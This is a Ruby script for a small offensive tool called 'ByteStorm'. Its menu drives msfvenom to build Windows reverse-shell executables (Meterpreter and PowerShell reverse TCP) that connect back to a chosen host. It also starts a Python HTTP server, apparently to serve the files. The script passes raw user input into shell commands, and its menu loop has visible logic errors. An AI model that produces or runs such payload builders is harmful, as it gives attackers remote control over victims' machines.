puts("
         #      ####
        #      #
       ###     ##
      #   #     #
      ####   ###
")

class ByteStorm
   attr_accessor :menu, :variants
   def BSconsole
      puts menu
      print "bs > "
   end
end

startMenu = ByteStorm.new()
startMenu.menu = "[01] Payload creator\n[02] Fast python http server\n[99] Exit"
class PythonServer < ByteStorm
   def pyServerStart(directory="~", addres="0.0.0.0", port="8000" )
      system("python3 -m http.server -d #{directory} -b #{addres} #{port}")
   end
   def BSconsole
      puts "Python http Server"
      puts "Select a host and port\n\ndefault 0.0.0.0:8000"
      print "host > "
      hst = gets.chomp

      print "port > "
      prt = gets.chomp
      print "directory > "
      dir = gets.chomp

      pyServerStart(dir, hst, prt)
   end
end
class PayLoadGen < ByteStorm
   def BSconsole

      puts "\n[01] windows, meterpreter\n[02] windows(x86), powershell\n[99] Exit"
      def cursor
         print "bs > "

      end
      cursor

      def payGen(type,lhost,lport,name)
            system("./msfvenom -p #{type} lhost=#{lhost} lport=#{lport} -f exe > #{name}")
      end
      ch = gets.to_i
      if ch == 1
         puts "Meterpreter selected"
         tp = "windows/meterpreter/reverse_tcp"
         print "lhost > "
         lhst = gets.chomp
         print "lport > "
         lprt = gets.chomp
         nm = "payload.exe"
         payGen(tp, lhst, lprt, nm)

      elsif ch == 2
         puts "Powershell selected"
         tp = "cmd/windows/powershell/powershell_reverse_tcp"
         print "lhost > "
         lhst = gets.chomp
         print "lport > "
         lprt = gets.chomp
         nm = "payload.exe"
         payGen(tp, lhst, lprt, nm)

      elsif ch == 99
         exit()
      end
   end
end
startMenu.BSconsole
startMenu.variants = gets.chomp.to_i

if startMenu.variants == 1
	firstOption = PayLoadGen.new()
	firstOption.BSconsole

elsif startMenu.variants == 2
   secondOption = PythonServer.new()
   secondOption.BSconsole
elsif startMenu.variants == 99
   exit()
else

   while startMenu.variants != 1
      puts "Unknown option"
      startMenu.BSconsole
      startMenu.variants = gets.chomp
      if startMenu.variants == 1
         firstOption = PayLoadGen.new()
         firstOption.BSconsole
      elsif
         firstOption = PayLoadGen.new()
         firstOption.BSconsole
      end
   end
end
